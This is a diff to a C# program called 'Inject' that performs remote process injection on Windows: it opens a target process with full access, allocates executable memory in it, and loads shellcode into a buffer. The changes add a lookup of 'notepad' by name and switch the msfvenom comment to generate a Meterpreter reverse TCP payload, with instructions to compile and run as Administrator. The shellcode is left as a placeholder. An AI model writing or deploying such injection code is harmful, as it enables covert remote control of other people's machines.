@@ -1,5 +1,7 @@
 using System;
 using System.Runtime.InteropServices;
+using System.Diagnostics;
+
 //This Project was built in C# so rename it to Sourcecode.cs before compiling or using
 
 namespace Inject
@@ -11,7 +13,7 @@ namespace Inject
  		//DWORD dwDesiredAccess,==>Read Write==> 0x001F0FFF.
  		//BOOL bInheritHandle,==> a Child who can inherit this handle 
 		//DWORD dwProcessID==>Process ID Targeted for example explorer.exe ==>Process explorer
-		};
+		//};
         
             [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
             static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
@@ -47,12 +49,13 @@ dwCreationFlags, IntPtr lpThreadId);
 	    	//Here you have to change the Process Number According to your targeted PID, you can make it more automated if you want in my case 
 		//for example my target process had PID 6040
 		//OpenProcess(Read_WritePermission, Inheritence, ProcessID), GetProcessByName can be used to Automatically Get The ProcessID
+		  //Process[] processes = Process.GetProcessesByName("notepad");
+		  //IntPtr hProcess = OpenProcess(0x001F0FFF, false, processes[0].Id);
                 IntPtr hProcess = OpenProcess(0x001F0FFF, false, 6040);
 		//The Allocation And Type Memory Protections
                 IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
-            //msfvenom -p windows/shell_reverse_tcp LHOST=<Local Host> LPORT=<LocalPortToListenOn> -f csharp
-	    
-	    //Compile on your linux machine using mcs: mcs sourcecode.cs ,it will output: sourcecode.exe, run the Sourcecode.exe as Administrator
+            //msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Local Host> LPORT=<LocalPortToListenOn> -f csharp
+	     //Compile on your linux machine using mcs: mcs sourcecode.cs ,it will output: sourcecode.exe, run the Sourcecode.exe as Administrator
 	    //don't forget to target the architecture because it can be a bit tricky
             byte[] buf = new byte[324] {YOUR-SHELL-CODE-GENERATED FROM MSFVENOM};
 
